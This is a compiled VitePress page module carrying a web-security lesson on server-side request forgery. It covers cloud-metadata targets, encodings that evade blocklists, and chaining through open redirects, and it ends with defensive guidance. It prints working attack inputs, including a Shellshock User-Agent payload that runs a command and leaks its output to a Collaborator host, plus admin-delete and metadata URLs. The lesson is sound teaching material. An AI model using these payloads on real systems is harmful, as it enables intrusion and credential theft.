import{_ as c,C as n,o as l,c as p,a6 as t,j as a,a as o,E as s,w as h}from"./chunks/framework.5dd0l9Wo.js";const S=JSON.parse('{"title":"Server-Side Request Forgery (SSRF) · Case File 16 (The Confused Deputy)","description":"Uncover how servers are tricked into fetching forbidden internal URLs, learn how bypasses overcome naive IP blocklists, and explore defensive isolation.","frontmatter":{"title":"Server-Side Request Forgery (SSRF) · Case File 16 (The Confused Deputy)","description":"Uncover how servers are tricked into fetching forbidden internal URLs, learn how bypasses overcome naive IP blocklists, and explore defensive isolation."},"headers":[],"relativePath":"ssrf/index.md","filePath":"ssrf/index.md"}'),u={name:"ssrf/index.md"},v={class:"wd-case"},g={class:"wd-step wd-step--break"};function m(f,e,b,w,k,y){const i=n("Term"),r=n("LabGroup"),d=n("TopicComplete");return l(),p("div",null,[e[12]||(e[12]=t('<h1 id="server-side-request-forgery-ssrf-·-the-confused-deputy-investigation" tabindex="-1">Server-Side Request Forgery (SSRF) · The Confused Deputy Investigation <a class="header-anchor" href="#server-side-request-forgery-ssrf-·-the-confused-deputy-investigation" aria-label="Permalink to &quot;Server-Side Request Forgery (SSRF) · The Confused Deputy Investigation&quot;">​</a></h1><p class="wd-section-lede">Server-Side Request Forgery (SSRF) turns a web server into a &quot;confused deputy.&quot; An attacker on the public internet cannot access private internal systems, backend databases, or cloud metadata services. However, the public-facing web server sits safely <em>inside</em> the corporate perimeter. If an application feature allows users to provide a URL for the server to fetch, an attacker can use the server as an internal proxy to explore and control the private network.</p><div class="wd-callout"><p><strong>💡 Everyday Analogy: The Trusted Courier.</strong> Imagine a heavily fortified corporate research campus protected by armed guards and biometric gates. You cannot walk past the front entrance. But right outside the gate is a courier window where anyone can hand in a pickup request: <em>&quot;Please run across town to Joe’s Coffee and fetch an espresso.&quot;</em> The courier leaves, grabs the coffee, and brings it back to you. Now imagine you hand the courier a slip that says: <em>&quot;Please walk into the basement vault in Building B and bring me the folder labeled Secret Schematics.&quot;</em> Because the courier wears an all-access security badge, interior security guards wave him right through the vault doors without asking any questions. In SSRF, the web server is that trusted courier.</p></div><hr><h2 id="case-file-16-the-internal-stock-api" tabindex="-1">Case File #16: The Internal Stock API <a class="header-anchor" href="#case-file-16-the-internal-stock-api" aria-label="Permalink to &quot;Case File #16: The Internal Stock API&quot;">​</a></h2><p>Let&#39;s investigate how a common store feature—checking warehouse stock—can be coerced into an internal network probe.</p>',6)),a("div",v,[e[10]||(e[10]=t(`<div class="wd-step wd-step--see"><span class="wd-step__tag">🔎 Step 1 · What You Notice in the Browser</span><p>You inspect the HTTP traffic when checking stock for a product. You notice the browser sends a POST parameter containing a complete URL pointing to a backend API:</p><div class="language-http"><pre><code>POST /product/stock HTTP/1.1
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&amp;storeId=1</code></pre></div></div><div class="wd-step wd-step--server"><span class="wd-step__tag">⚙️ Step 2 · What the Server Does Behind the Scenes</span><p>The public web server receives the <code>stockApi</code> parameter and passes it directly to an internal HTTP client library (such as cURL, Python <code>requests</code>, or Node.js <code>fetch</code>). The server makes an outbound HTTP GET request to that address:</p><div class="wd-codesplit"><div class="wd-codesplit__legend"><span><span class="wd-code-dev">Blue</span> = Server HTTP Client</span><span><span class="wd-code-input">Gold</span> = Target URL Parameter</span></div><span class="wd-code-dev">fetch(</span><span class="wd-code-input">&quot;http://stock.weliketoshop.net:8080/product/stock/check?productId=1&amp;storeId=1&quot;</span><span class="wd-code-dev">)</span></div></div>`,2)),a("div",g,[e[9]||(e[9]=a("span",{class:"wd-step__tag"},"💥 Step 3 · Where the Logic Breaks",-1)),a("p",null,[e[1]||(e[1]=o("The server never verifies whether the destination URL is an external web page or a private internal resource. By replacing the value with an ",-1)),s(i,{id:"ssrf-loopback"},{default:h(()=>[...e[0]||(e[0]=[o("internal loopback",-1)])]),_:1}),e[2]||(e[2]=o(" address like ",-1)),e[3]||(e[3]=a("code",null,"http://127.0.0.1/admin",-1)),e[4]||(e[4]=o(" or ",-1)),e[5]||(e[5]=a("code",null,"http://169.254.169.254/latest/meta-data/",-1)),e[6]||(e[6]=o(", you force the server to talk to itself or to internal cloud APIs. Because the request originates from ",-1)),e[7]||(e[7]=a("code",null,"127.0.0.1",-1)),e[8]||(e[8]=o(" inside the server's private network, internal admin portals trust it without asking for a password!",-1))])]),e[11]||(e[11]=t('<div class="wd-step wd-step--fix"><span class="wd-step__tag">🛡️ Step 4 · How Developers Lock It Down</span><p>Developers implement strict destination validation. They resolve the domain name to an IP address, verify that the IP is not in any private or loopback range (like <code>127.0.0.0/8</code>, <code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code>, or <code>169.254.169.254</code>), and then connect directly to the validated IP to prevent DNS rebinding attacks.</p></div>',1))]),e[13]||(e[13]=t('<h3 id="visual-comparison-public-microservice-vs-internal-administrative-interface" tabindex="-1">Visual Comparison: Public Microservice vs. Internal Administrative Interface <a class="header-anchor" href="#visual-comparison-public-microservice-vs-internal-administrative-interface" aria-label="Permalink to &quot;Visual Comparison: Public Microservice vs. Internal Administrative Interface&quot;">​</a></h3><div class="wd-compare"><div class="wd-compare__card wd-compare__card--expect"><span class="wd-compare__title">💭 What the Developer Expected</span><p>The developer designed <code>stockApi</code> to talk exclusively to the store&#39;s dedicated warehouse inventory API running on <code>stock.weliketoshop.net</code>.</p></div><div class="wd-compare__card wd-compare__card--actual"><span class="wd-compare__title">💥 What Actually Happened</span><p>An attacker changed the parameter to <code>http://localhost/admin/delete?username=carlos</code>. The server&#39;s HTTP client connected directly to its own local loopback interface, bypassed authentication, and deleted Carlos&#39;s account.</p></div></div><h3 id="watch-the-destination-transform-color-by-color" tabindex="-1">Watch the Destination Transform Color by Color <a class="header-anchor" href="#watch-the-destination-transform-color-by-color" aria-label="Permalink to &quot;Watch the Destination Transform Color by Color&quot;">​</a></h3><p>See how modifying the URL parameter redirects the server&#39;s HTTP client into internal networks:</p><div class="wd-codesplit"><div class="wd-codesplit__legend"><span><span class="wd-code-dev">Blue</span> = Backend Fetch Function</span><span><span class="wd-code-input">Gold</span> = Injected Private Target</span></div><span class="wd-code-dev">http_client.get(</span><span class="wd-code-input">&quot;http://192.168.0.68/admin&quot;</span><span class="wd-code-dev">)</span></div><hr><h2 id="the-4-stage-journey-of-an-ssrf-request" tabindex="-1">The 4-Stage Journey of an SSRF Request <a class="header-anchor" href="#the-4-stage-journey-of-an-ssrf-request" aria-label="Permalink to &quot;The 4-Stage Journey of an SSRF Request&quot;">​</a></h2><p>Notice how the request crosses the external perimeter into the trusted internal zone:</p><div class="wd-flow"><div class="wd-flow__node"><strong>1. Attacker Request</strong> Sends <code>stockApi=http://127.0.0.1/admin</code> across public internet to Web App. </div><span class="wd-flow__arrow">→</span><div class="wd-flow__node wd-flow__node--danger"><strong>2. Perimeter Check Passed</strong> Firewall accepts request because it is ordinary traffic directed at port 443. </div><span class="wd-flow__arrow">→</span><div class="wd-flow__node"><strong>3. Server Outbound Call</strong> Application initiates a second connection directed at internal interface <code>127.0.0.1</code>. </div><span class="wd-flow__arrow">→</span><div class="wd-flow__node wd-flow__node--safe"><strong>4. Intranet Trust</strong> Internal service receives request from <code>localhost</code> and grants administrative privileges. </div></div><hr><h2 id="where-can-the-server-reach-common-internal-targets" tabindex="-1">Where Can the Server Reach? (Common Internal Targets) <a class="header-anchor" href="#where-can-the-server-reach-common-internal-targets" aria-label="Permalink to &quot;Where Can the Server Reach? (Common Internal Targets)&quot;">​</a></h2><p>When you discover an SSRF vector, there are three primary internal targets you should investigate:</p><ol><li><strong>Local Loopback (<code>127.0.0.1</code> / <code>localhost</code>):</strong> Services running locally on the same physical host that do not require authentication for local users (administrative endpoints, debugging consoles, Redis, local databases).</li><li><strong>Private Backend Networks (RFC 1918):</strong> Other servers in the private subnet (e.g. <code>192.168.0.X</code> or <code>10.0.0.X</code>). Even if not exposed to the internet, you can sweep internal IP ranges to discover private dashboards and internal APIs.</li><li><strong>Cloud Instance Metadata (<code>169.254.169.254</code>):</strong> A magical link-local address present on AWS, GCP, Azure, and DigitalOcean virtual machines. Querying <code>http://169.254.169.254/latest/meta-data/</code> on AWS can yield temporary IAM credentials, security tokens, and infrastructure secrets.</li></ol>',13)),s(r,{ids:"ssrf-lab-basic-ssrf-against-localhost, ssrf-lab-basic-ssrf-against-backend-system"}),e[14]||(e[14]=t('<hr><h2 id="blind-ssrf-hunting-with-out-of-band-interaction-oast" tabindex="-1">Blind SSRF: Hunting with Out-of-Band Interaction (OAST) <a class="header-anchor" href="#blind-ssrf-hunting-with-out-of-band-interaction-oast" aria-label="Permalink to &quot;Blind SSRF: Hunting with Out-of-Band Interaction (OAST)&quot;">​</a></h2><p>In many real-world scenarios, the server fetches the URL you provide, but never returns the response body on the screen. It might use the fetched resource internally (such as parsing analytics, rendering an avatar, or firing a webhook).</p><p>To verify the vulnerability, you use <strong>Out-of-Band Application Security Testing (OAST)</strong>:</p><ol><li>Supply a domain you control (such as a unique Burp Collaborator address) as the target URL: <code>http://subdomain.burpcollaborator.net</code>.</li><li>Monitor your Collaborator listener.</li><li>If the server makes an HTTP request or DNS resolution back to your server, you have confirmed that the backend executes outbound requests under your control.</li></ol>',5)),s(r,{ids:"ssrf-lab-out-of-band-detection"}),e[15]||(e[15]=t('<hr><h2 id="bypassing-naive-blacklist-filters" tabindex="-1">Bypassing Naive Blacklist Filters <a class="header-anchor" href="#bypassing-naive-blacklist-filters" aria-label="Permalink to &quot;Bypassing Naive Blacklist Filters&quot;">​</a></h2><p>Developers often attempt to stop SSRF by checking if the user&#39;s input contains words like <code>127.0.0.1</code>, <code>localhost</code>, or <code>admin</code>. String-based blocklists are notoriously brittle because IP addresses and hostnames have many alternate representations:</p><table tabindex="0"><thead><tr><th>Input</th><th>Format</th><th>How the System Resolves It</th></tr></thead><tbody><tr><td><code>127.0.0.1</code></td><td>Standard dotted decimal</td><td>Standard loopback address</td></tr><tr><td><code>127.1</code></td><td>Shortened dotted decimal (<code>inet_aton</code>)</td><td>The OS expands <code>127.1</code> directly to <code>127.0.0.1</code></td></tr><tr><td><code>2130706433</code></td><td>32-bit Integer / Decimal</td><td>The entire 4-byte address represented as a decimal integer</td></tr><tr><td><code>0x7f000001</code></td><td>Hexadecimal</td><td>Hex representation of <code>127.0.0.1</code></td></tr><tr><td><code>[::1]</code></td><td>IPv6 Loopback</td><td>The IPv6 equivalent of localhost</td></tr><tr><td><code>127.0.0.1.nip.io</code></td><td>Wildcard DNS service</td><td>A public domain name configured to resolve to <code>127.0.0.1</code></td></tr></tbody></table><details class="details custom-block"><summary>🔬 Under the Hood: Why <code>127.1</code> Works in Almost Every Network Stack</summary><p>The standard POSIX networking library function <code>inet_aton</code> (which parses IPv4 addresses) supports several historical shorthand formats:</p><ul><li>4 parts (<code>a.b.c.d</code>): Standard format.</li><li>3 parts (<code>a.b.c</code>): <code>c</code> is treated as a 16-bit number placed in the last two bytes (<code>a.b.0.c</code>).</li><li>2 parts (<code>a.b</code>): <code>b</code> is treated as a 24-bit number placed in the last three bytes (<code>a.0.0.b</code>). Therefore, <code>127.1</code> means <code>127.0.0.1</code>!</li><li>1 part (<code>a</code>): <code>a</code> is stored as a 32-bit integer. <code>2130706433</code> corresponds to <code>(127 &lt;&lt; 24) + 1 = 127.0.0.1</code>.</li></ul><p>A string filter looking for <code>&quot;127.0.0.1&quot;</code> sees none of these variations, yet the networking stack connects to loopback every single time.</p></details>',5)),s(r,{ids:"ssrf-lab-ssrf-with-blacklist-filter"}),e[16]||(e[16]=t('<hr><h2 id="bypassing-whitelist-filters-open-redirection" tabindex="-1">Bypassing Whitelist Filters &amp; Open Redirection <a class="header-anchor" href="#bypassing-whitelist-filters-open-redirection" aria-label="Permalink to &quot;Bypassing Whitelist Filters &amp; Open Redirection&quot;">​</a></h2><p>Allow-lists (whitelists) are far more secure than blocklists, but they can still be defeated when the validation parser and the HTTP client interpret URLs differently:</p><h3 id="_1-url-parser-discrepancies" tabindex="-1">1. URL Parser Discrepancies <a class="header-anchor" href="#_1-url-parser-discrepancies" aria-label="Permalink to &quot;1. URL Parser Discrepancies&quot;">​</a></h3><ul><li><strong>Userinfo Credentials (<code>@</code>):</strong> In <code>https://expected-host.com@attacker.com</code>, standard URL specifications state that <code>expected-host.com</code> is a username, and <code>attacker.com</code> is the actual destination host. If a weak regex only checks if the string starts with <code>https://expected-host.com</code>, the check is bypassed.</li><li><strong>Fragment and Query Identifiers (<code>#</code> and <code>?</code>):</strong> <code>https://attacker.com#expected-host.com</code> or <code>https://attacker.com?expected-host.com</code>.</li><li><strong>Subdomain Trickery:</strong> <code>https://expected-host.com.attacker.com</code>.</li></ul><h3 id="_2-chaining-ssrf-with-open-redirection" tabindex="-1">2. Chaining SSRF with Open Redirection <a class="header-anchor" href="#_2-chaining-ssrf-with-open-redirection" aria-label="Permalink to &quot;2. Chaining SSRF with Open Redirection&quot;">​</a></h3><p>If the application strictly verifies that the URL begins with <code>https://allowed-domain.com</code>, look for an <strong>Open Redirection</strong> vulnerability on that allowed domain:</p><div class="language-http vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">http</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">stockApi=https://allowed-domain.com/oauth/callback?redirect_url=http://192.168.0.68/admin</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><ol><li>The validation check verifies that <code>stockApi</code> points to <code>allowed-domain.com</code>. The check passes!</li><li>The server&#39;s HTTP client connects to <code>allowed-domain.com</code>.</li><li>The server receives a <code>302 Found</code> redirect header pointing to <code>http://192.168.0.68/admin</code>.</li><li>The HTTP client automatically follows the redirect straight into the internal network!</li></ol>',9)),s(r,{ids:"ssrf-lab-ssrf-filter-bypass-via-open-redirection, ssrf-lab-ssrf-with-whitelist-filter"}),e[17]||(e[17]=t('<hr><h2 id="escalating-ssrf-to-rce-shellshock" tabindex="-1">Escalating SSRF to RCE: Shellshock <a class="header-anchor" href="#escalating-ssrf-to-rce-shellshock" aria-label="Permalink to &quot;Escalating SSRF to RCE: Shellshock&quot;">​</a></h2><p>SSRF is not just for reading files; it can be used to deliver active exploits to unpatched internal systems.</p><p>For instance, if an internal backend system runs legacy CGI scripts vulnerable to <strong>Shellshock</strong> (CVE-2014-6271), an attacker can use SSRF to send an HTTP request to that internal endpoint with a crafted <code>User-Agent</code> header containing a Bash function definition:</p><div class="language-http vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">http</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">User-Agent</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> () { :; }; /usr/bin/nslookup $(whoami).burpcollaborator.net</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>When the internal web server invokes the CGI script, Bash parses the environment variable and executes the command, escalating a simple request forgery into full Remote Code Execution (RCE).</p>',6)),s(r,{ids:"ssrf-lab-shellshock-exploitation"}),e[18]||(e[18]=t('<details class="details custom-block"><summary>⚙️ Engine Variations: How URL Parsers Disagree</summary><p>Different languages parse edge-case URLs differently:</p><ul><li><strong>Python <code>urllib.parse</code>:</strong> Historically parsed URLs with backslashes and port notations differently from modern browsers.</li><li><strong>Java <code>java.net.URL</code> vs <code>java.net.URI</code>:</strong> <code>URL</code> handles certain malformed credential syntaxes that cause <code>URI</code> to throw an exception.</li><li><strong>cURL:</strong> By default supports non-HTTP protocols such as <code>gopher://</code>, <code>dict://</code>, <code>file://</code>, and <code>ldap://</code>. Restricting protocols using <code>--proto =http,https</code> is essential.</li></ul></details><hr><h2 id="defensive-blueprint-building-an-airtight-ssrf-defense" tabindex="-1">Defensive Blueprint: Building an Airtight SSRF Defense <a class="header-anchor" href="#defensive-blueprint-building-an-airtight-ssrf-defense" aria-label="Permalink to &quot;Defensive Blueprint: Building an Airtight SSRF Defense&quot;">​</a></h2><p>Securing an application against SSRF requires defense-in-depth across the network and application layers:</p><div class="wd-callout wd-callout--warn"><p><strong>🛡️ The 4 Pillars of SSRF Prevention:</strong></p><ol><li><strong>Resolve and validate before connecting:</strong> Never rely on string checks. Parse the URL, resolve the hostname to its IP address via DNS, and verify that the resolved IP does not belong to loopback (<code>127.0.0.0/8</code>), private ranges (RFC 1918), or link-local ranges (<code>169.254.0.0/16</code>).</li><li><strong>Pin the connection (Prevent DNS Rebinding):</strong> Connect directly to the validated IP address rather than re-resolving the hostname, ensuring an attacker cannot change the DNS record between the check and the connection.</li><li><strong>Disable automatic redirects:</strong> If the client must follow redirects, ensure every redirected hop passes through the same IP validation pipeline.</li><li><strong>Harden cloud metadata services:</strong> Enforce <strong>IMDSv2</strong> on AWS instances, which requires a pre-negotiated session token via a <code>PUT</code> request with custom headers, neutralizing simple SSRF GET requests.</li></ol></div>',5)),s(d,{"topic-id":"server-side-request-forgery-ssrf",label:"Mark SSRF complete"})])}const T=c(u,[["render",m]]);export{S as __pageData,T as default};
